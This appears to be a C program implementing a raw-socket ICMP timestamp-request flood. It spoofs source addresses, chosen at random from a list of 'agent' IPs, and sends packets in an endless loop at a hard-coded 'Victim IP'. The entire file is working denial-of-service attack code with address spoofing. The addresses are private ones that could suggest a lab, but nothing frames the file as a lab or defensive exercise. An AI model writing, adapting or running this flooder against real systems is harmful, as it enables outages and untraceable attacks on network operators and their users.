#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <time.h>
#include <netinet/tcp.h>

/* Internet Checksum */
unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char*)buf;

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

struct pseudo_header {
    unsigned int src, dst;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_len;
};

int main() {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) {
        perror("Socket");
        return 1;
    }

    char packet[1024];
    memset(packet, 0, sizeof(packet));

    // IP header
    struct iphdr *ip = (struct iphdr*)packet;
    struct icmphdr *icmp = (struct icmphdr*)(packet + sizeof(struct iphdr));
    struct sockaddr_in dest;
  
    // Victim
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr("10.0.0.2");   // Victim IP
    
    // Spoofed agent IPs
    char *spoofed_ips[] = {
        "10.0.0.3",
        "10.0.0.4",
        "10.0.0.5",
        "10.0.0.6"
    };
    
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    printf("Starting ICMP flood towards 10.0.0.2...\n");
    
    while (1) {
        memset(packet, 0, 1024);
        
        // Select random spoofed source
        char *src_ip = spoofed_ips[rand() % 4];
        
        // Fill IP header
        ip->ihl = 5;
        ip->version = 4;
        ip->tos = 0;
        ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct icmphdr) + 12);
        ip->id = htons(1234);
        ip->ttl = 64;
        ip->protocol = IPPROTO_ICMP;
        ip->saddr = inet_addr(src_ip);  // Example spoofed source
        ip->daddr = inet_addr("10.0.0.2");  // Victim IP

        // Fill ICMP header
        icmp->type = 13;   // Timestamp request
        icmp->code = 0;
        icmp->un.echo.id = htons(1);
        icmp->un.echo.sequence = htons(1);
        
        // Timestamp payload (originate, receive, transmit)
        uint32_t *timestamps = (uint32_t*)(packet + sizeof(struct iphdr) + sizeof(struct icmphdr));

        uint32_t now = (uint32_t) (clock() * 1000 / CLOCKS_PER_SEC);
        timestamps[0] = htonl(now);
        timestamps[1] = 0;
        timestamps[2] = 0;

        // Checksums
        icmp->checksum = 0;
        icmp->checksum = checksum(icmp, sizeof(struct icmphdr) + 12);

        ip->check = 0;
        ip->check = checksum(ip, sizeof(struct iphdr));

        // Destination
        struct sockaddr_in dest;
        dest.sin_family = AF_INET;
        dest.sin_addr.s_addr = ip->daddr;

        // Send ONE packet
        if (sendto(sock, packet, ntohs(ip->tot_len), 0,
                   (struct sockaddr*)&dest, sizeof(dest)) < 0) {
            perror("Send");
            return 1;
        }

        printf("Sent ONE ICMP timestamp packet (RAW socket).\n");
        
  }
  
  return 0;
}
